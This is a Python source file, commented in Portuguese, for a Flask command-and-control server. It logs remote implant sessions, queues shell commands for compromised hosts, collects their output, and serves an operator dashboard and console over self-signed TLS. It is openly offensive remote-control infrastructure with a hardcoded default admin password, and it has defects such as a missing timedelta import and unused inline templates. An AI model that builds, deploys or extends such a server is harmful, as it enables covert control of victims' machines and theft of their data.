#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
from flask_socketio import SocketIO
import logging
from logging.handlers import RotatingFileHandler
import ssl
import uuid
import json

# Configuração básica
app = Flask(__name__)
app.secret_key = os.urandom(24)
socketio = SocketIO(app)
auth = HTTPBasicAuth()

# Configuração de logging
handler = RotatingFileHandler('c2_server.log', maxBytes=100000, backupCount=3)
handler.setFormatter(logging.Formatter(
    '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
))
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

# Banco de dados SQLite
def init_db():
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    
    # Tabela de sessões
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id TEXT PRIMARY KEY,
                  ip TEXT,
                  hostname TEXT,
                  os TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  active INTEGER)''')
    
    # Tabela de comandos
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  session_id TEXT,
                  command TEXT,
                  output TEXT,
                  timestamp TEXT)''')
    
    # Tabela de usuários
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (username TEXT PRIMARY KEY,
                  password TEXT,
                  last_login TEXT)''')
    
    # Inserir usuário admin padrão se não existir
    c.execute("SELECT COUNT(*) FROM users WHERE username='admin'")
    if c.fetchone()[0] == 0:
        hashed_pw = generate_password_hash("s3cr3t_p@ssw0rd")
        c.execute("INSERT INTO users VALUES (?, ?, ?)",
                  ('admin', hashed_pw, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

init_db()

# Autenticação
users = {}
def load_users():
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    c.execute("SELECT username, password FROM users")
    global users
    users = {row[0]: row[1] for row in c.fetchall()}
    conn.close()

load_users()

@auth.verify_password
def verify_password(username, password):
    if username in users and check_password_hash(users.get(username), password):
        app.logger.info(f"Usuário autenticado: {username}")
        return username
    return None

# Rotas da API
@app.route('/api/collect', methods=['POST'])
@auth.login_required
def collect_data():
    data = request.json
    session_id = data.get('session_id')
    ip = request.remote_addr
    
    if not session_id:
        return jsonify({"status": "error", "message": "Session ID missing"}), 400
    
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    
    # Verifica se a sessão existe
    c.execute("SELECT id FROM sessions WHERE id=?", (session_id,))
    if not c.fetchone():
        # Nova sessão
        c.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (session_id, ip, data.get('hostname'), data.get('os'),
                   datetime.now().isoformat(), datetime.now().isoformat(), 1))
        app.logger.info(f"Nova sessão registrada: {session_id}")
    else:
        # Atualiza última atividade
        c.execute("UPDATE sessions SET last_seen=?, active=1 WHERE id=?",
                  (datetime.now().isoformat(), session_id))
    
    # Registra comandos/respostas
    if 'command_output' in data:
        for cmd_id, output in data['command_output'].items():
            c.execute("UPDATE commands SET output=? WHERE rowid=? AND session_id=?",
                      (output, cmd_id, session_id))
    
    conn.commit()
    conn.close()
    
    # Envia notificação para o dashboard
    socketio.emit('session_update', {'session_id': session_id})
    
    return jsonify({"status": "success"})

@app.route('/api/command', methods=['POST'])
@auth.login_required
def send_command():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command')
    
    if not session_id or not command:
        return jsonify({"status": "error", "message": "Missing parameters"}), 400
    
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    
    # Insere o novo comando
    c.execute("INSERT INTO commands (session_id, command, timestamp) VALUES (?, ?, ?)",
              (session_id, command, datetime.now().isoformat()))
    cmd_id = c.lastrowid
    
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success", "command_id": cmd_id})

# Rotas do Dashboard
@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in users and check_password_hash(users.get(username), password):
            session['logged_in'] = True
            session['username'] = username
            app.logger.info(f"Login bem-sucedido: {username}")
            
            # Atualiza último login
            conn = sqlite3.connect('c2_database.db')
            c = conn.cursor()
            c.execute("UPDATE users SET last_login=? WHERE username=?",
                      (datetime.now().isoformat(), username))
            conn.commit()
            conn.close()
            
            return redirect(url_for('index'))
        
        return render_template('login.html', error="Credenciais inválidas")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))

# API para o dashboard
@app.route('/api/sessions')
@auth.login_required
def get_sessions():
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    
    c.execute("SELECT id, ip, hostname, os, first_seen, last_seen, active FROM sessions")
    sessions = []
    for row in c.fetchall():
        sessions.append({
            'id': row[0],
            'ip': row[1],
            'hostname': row[2],
            'os': row[3],
            'first_seen': row[4],
            'last_seen': row[5],
            'active': bool(row[6])
        })
    
    conn.close()
    return jsonify(sessions)

@app.route('/api/commands/<session_id>')
@auth.login_required
def get_commands(session_id):
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    
    c.execute("SELECT rowid, command, output, timestamp FROM commands WHERE session_id=? ORDER BY timestamp DESC", (session_id,))
    commands = []
    for row in c.fetchall():
        commands.append({
            'id': row[0],
            'command': row[1],
            'output': row[2],
            'timestamp': row[3]
        })
    
    conn.close()
    return jsonify(commands)

# WebSocket events
@socketio.on('connect')
def handle_connect():
    app.logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    app.logger.info(f"Client disconnected: {request.sid}")

# Templates (inline para simplificação)
@app.context_processor
def inject_templates():
    return dict(
        login_template='''
        <!DOCTYPE html>
        <html>
        <head><title>C2 Login</title></head>
        <body>
            <h1>C2 Admin Login</h1>
            {% if error %}<p style="color:red">{{ error }}</p>{% endif %}
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        ''',
        dashboard_template='''
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Dashboard</title>
            <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                #sessions { border-collapse: collapse; width: 100%; }
                #sessions th, #sessions td { border: 1px solid #ddd; padding: 8px; }
                #sessions tr:nth-child(even) { background-color: #f2f2f2; }
                #sessions th { background-color: #4CAF50; color: white; }
                .active { background-color: #d4edda !important; }
                .inactive { background-color: #f8d7da !important; }
                #command-output { background: #333; color: #0f0; padding: 10px; }
            </style>
        </head>
        <body>
            <h1>C2 Dashboard <small>({{ username }})</small></h1>
            <a href="{{ url_for('logout') }}">Logout</a>
            <hr>
            
            <h2>Sessões Ativas</h2>
            <table id="sessions">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>IP</th>
                        <th>Hostname</th>
                        <th>OS</th>
                        <th>First Seen</th>
                        <th>Last Seen</th>
                        <th>Status</th>
                        <th>Ações</th>
                    </tr>
                </thead>
                <tbody id="sessions-body">
                    <!-- Dinamicamente preenchido via JavaScript -->
                </tbody>
            </table>
            
            <div id="session-details" style="display:none; margin-top:20px;">
                <h3>Detalhes da Sessão: <span id="session-id"></span></h3>
                <div style="display:flex;">
                    <div style="flex:1;">
                        <h4>Comandos Enviados</h4>
                        <div id="commands-list"></div>
                        <form id="command-form">
                            <input type="text" id="command-input" style="width:70%;">
                            <button type="submit">Enviar</button>
                        </form>
                    </div>
                    <div style="flex:1;">
                        <h4>Saída</h4>
                        <pre id="command-output"></pre>
                    </div>
                </div>
            </div>
            
            <script>
                const socket = io();
                let currentSession = null;
                
                // Atualiza lista de sessões
                function updateSessions() {
                    fetch('/api/sessions')
                        .then(res => res.json())
                        .then(sessions => {
                            const tbody = document.getElementById('sessions-body');
                            tbody.innerHTML = '';
                            
                            sessions.forEach(session => {
                                const tr = document.createElement('tr');
                                tr.className = session.active ? 'active' : 'inactive';
                                tr.innerHTML = `
                                    <td>${session.id}</td>
                                    <td>${session.ip}</td>
                                    <td>${session.hostname || 'N/A'}</td>
                                    <td>${session.os || 'N/A'}</td>
                                    <td>${new Date(session.first_seen).toLocaleString()}</td>
                                    <td>${new Date(session.last_seen).toLocaleString()}</td>
                                    <td>${session.active ? 'Ativo' : 'Inativo'}</td>
                                    <td><button onclick="showSession('${session.id}')">Interagir</button></td>
                                `;
                                tbody.appendChild(tr);
                            });
                        });
                }
                
                // Mostra detalhes de uma sessão
                function showSession(sessionId) {
                    currentSession = sessionId;
                    document.getElementById('session-details').style.display = 'block';
                    document.getElementById('session-id').textContent = sessionId;
                    
                    fetch(`/api/commands/${sessionId}`)
                        .then(res => res.json())
                        .then(commands => {
                            const list = document.getElementById('commands-list');
                            list.innerHTML = '';
                            
                            commands.forEach(cmd => {
                                const div = document.createElement('div');
                                div.innerHTML = `<strong>${new Date(cmd.timestamp).toLocaleString()}:</strong> ${cmd.command}`;
                                if (cmd.output) {
                                    const pre = document.createElement('pre');
                                    pre.textContent = cmd.output;
                                    div.appendChild(pre);
                                }
                                list.appendChild(div);
                            });
                        });
                }
                
                // Envia comando
                document.getElementById('command-form').addEventListener('submit', e => {
                    e.preventDefault();
                    const command = document.getElementById('command-input').value;
                    
                    fetch('/api/command', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            session_id: currentSession,
                            command: command
                        })
                    }).then(() => {
                        document.getElementById('command-input').value = '';
                        showSession(currentSession);
                    });
                });
                
                // Atualizações em tempo real via WebSocket
                socket.on('session_update', data => {
                    updateSessions();
                    if (currentSession === data.session_id) {
                        showSession(currentSession);
                    }
                });
                
                // Inicialização
                updateSessions();
                setInterval(updateSessions, 10000);
            </script>
        </body>
        </html>
        '''
    )

# Configuração SSL
def create_self_signed_cert():
    if not os.path.exists('c2_cert.pem') or not os.path.exists('c2_key.pem'):
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend

        # Gera chave privada
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Gera certificado autoassinado
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "C2 Server"),
            x509.NameAttribute(NameOID.COMMON_NAME, "c2.example.com"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())
        
        # Salva certificado e chave
        with open("c2_cert.pem", "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open("c2_key.pem", "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

if __name__ == '__main__':
    create_self_signed_cert()
    
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain('c2_cert.pem', 'c2_key.pem')
    
    print("=== C2 Admin Console ===")
    print(f"Servidor C2 iniciando em https://0.0.0.0:8080")
    print("Type 'help' for available commands")
    
    # Thread para comandos do console
    def console_thread():
        while True:
            cmd = input("C2> ").strip().lower()
            
            if cmd == 'help':
                print("\nComandos disponíveis:")
                print("  help       - Mostra esta ajuda")
                print("  sessions   - Lista sessões ativas")
                print("  exit       - Encerra o servidor")
                print("  clear      - Limpa o console")
                print("  users      - Gerencia usuários\n")
            
            elif cmd == 'sessions':
                conn = sqlite3.connect('c2_database.db')
                c = conn.cursor()
                c.execute("SELECT id, ip, hostname, os, last_seen, active FROM sessions")
                print("\nSessões ativas:")
                for row in c.fetchall():
                    status = "ATIVA" if row[5] else "inativa"
                    print(f"  {row[0]} ({row[1]}) - {row[2]} ({row[3]}) - Última atividade: {row[4]} - {status}")
                conn.close()
                print()
            
            elif cmd == 'exit':
                print("Encerrando servidor...")
                os._exit(0)
            
            elif cmd == 'clear':
                os.system('clear' if os.name == 'posix' else 'cls')
            
            elif cmd == 'users':
                print("\nGerenciamento de usuários:")
                print("  list       - Lista usuários")
                print("  add <user> <pass> - Adiciona usuário")
                print("  del <user> - Remove usuário\n")
    
    threading.Thread(target=console_thread, daemon=True).start()
    
    # Inicia servidor Flask com SSL
    socketio.run(app, host='0.0.0.0', port=8080, ssl_context=ssl_context)
